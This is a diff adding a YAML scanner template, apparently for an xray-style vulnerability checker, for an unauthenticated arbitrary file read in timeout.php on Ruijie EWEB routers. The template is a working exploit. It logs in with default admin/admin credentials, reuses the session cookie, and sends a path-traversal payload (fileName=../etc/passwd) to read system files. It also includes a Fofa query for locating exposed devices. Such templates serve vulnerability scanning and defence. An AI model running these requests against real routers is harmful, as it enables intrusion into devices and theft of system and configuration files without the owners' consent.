@@ -1,0 +1,45 @@
+id: ruijie-route-timeout-fileread
+
+info:
+  name: 锐捷EWEB路由器 timeout.php 任意文件读取漏洞
+  author: avic123
+  severity: high
+  verified: true
+  description: |
+    锐捷EWEB路由器 timeout.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    Fofa: title="锐捷网络-EWEB网管系统"
+  reference:
+    - https://cn-sec.com/archives/4354208.html
+  tags: ruijie,router,rce
+  created: 2025/8/11
+
+set:
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ddi/server/login.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        username=admin&password=admin?
+    expression: >-
+      response.status == 200
+    output:
+      search: '"Set-Cookie: (?P<cookie>.+)".bsubmatch(response.raw_header)'
+      cookie_login: search["cookie"]
+  r1:
+    request:
+      method: POST
+      path: /system_pi/timeout.php?a=getFile
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: "{{cookie_login}}"
+      body: |
+        fileName=../etc/passwd
+    expression: >-
+      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+
+expression: r0() && r1()
